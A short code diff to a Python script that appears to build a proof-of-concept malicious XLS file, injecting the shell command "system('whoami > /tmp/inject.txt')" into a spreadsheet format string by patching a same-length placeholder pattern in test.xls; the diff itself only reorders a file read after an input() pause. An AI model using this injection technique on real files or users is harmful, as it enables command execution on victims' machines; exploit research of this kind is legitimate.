@@ -1,10 +1,11 @@
-xls = open('test.xls', 'rb').read()
-
 # Inject shell to format string
 shell = "system('whoami > /tmp/inject.txt')"
 fmtStr = f'[>123;{shell}]123'
 pattern = f'"{"a" * (len(fmtStr) - 2)}"'
 print(pattern)
+input()
+
+xls = open('test.xls', 'rb').read()
 
 l = xls.index(pattern.encode())
 assert l != -1 #Pattern must exist
